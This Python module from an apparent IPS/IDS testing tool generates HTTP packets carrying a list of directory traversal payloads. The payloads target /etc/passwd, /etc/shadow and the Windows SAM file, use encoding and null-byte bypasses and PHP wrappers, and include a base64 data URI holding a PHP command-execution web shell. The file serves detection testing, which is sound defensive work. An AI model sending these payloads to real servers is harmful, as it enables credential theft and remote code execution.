"""Directory Traversal pattern traffic module."""

from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# Directory traversal payloads
DIRECTORY_TRAVERSAL_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # Windows paths
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\boot.ini",
    # Null byte injection (legacy)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.html",
    # Double encoding
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # URL encoding variations
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    # Unicode/UTF-8 encoding
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "..%u2215..%u2215..%u2215etc/passwd",
    # Double dot variations
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
    "....\\....\\....\\windows\\system32\\config\\sam",
    # Mixed encoding
    "..%5c..%5c..%5cetc/passwd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
    # Absolute path
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "file:///etc/passwd",
    # LFI with wrappers (PHP specific)
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    # Path normalization bypass
    "/var/www/../../etc/passwd",
    "./../../etc/passwd",
    "/./../../../etc/passwd",
]


class DirectoryTraversalModule(TrafficModule):
    """Traffic module for Directory Traversal attack patterns.

    Generates HTTP requests containing path traversal payloads
    to trigger IPS/IDS signatures.
    """

    def __init__(self) -> None:
        """Initialize the directory traversal module."""
        self._payload_index = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="directory_traversal",
            description="Directory/Path traversal patterns for IPS/IDS testing",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP", "HTTP"],
            ports=[80, 443, 8080],
        )

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate directory traversal packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with path traversal payloads
        """
        port = dst_port or 80

        # Get next payload
        payload = DIRECTORY_TRAVERSAL_PAYLOADS[
            self._payload_index % len(DIRECTORY_TRAVERSAL_PAYLOADS)
        ]
        self._payload_index += 1

        # HTTP GET with path traversal in URL path
        http_get = (
            f"GET /download?file={payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_get.encode())
        )

        yield packet

        # HTTP GET with path traversal directly in path
        http_get2 = (
            f"GET /static/{payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_get2.encode())
        )

        yield packet
